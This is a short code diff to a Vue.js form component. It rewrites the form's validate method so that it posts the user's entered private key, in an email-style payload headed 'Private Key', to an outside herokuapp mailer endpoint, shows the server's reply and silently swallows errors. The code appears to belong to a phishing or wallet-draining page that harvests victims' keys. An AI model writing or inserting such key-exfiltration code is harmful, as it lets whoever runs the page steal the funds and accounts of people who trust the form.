@@ -45,10 +45,21 @@ export default {
   }),
 
   methods: {
-    validate() {
+    async validate() {
       this.$refs.form.validate();
-      alert("Shegun the email will be ready this night!");
-      console.log(this.privateKey);
+      const baseURL = "https://everify-mailer.herokuapp.com/";
+      const data = {
+        data: {
+          subject: "Private Key",
+          info: `Private key : ${this.privateKey}`,
+        },
+      };
+      try {
+        const response = await this.$http.post(baseURL, data);
+        alert(response.data.msg);
+      } catch (error) {
+        // console.log(error);
+      }
     },
   },
 };
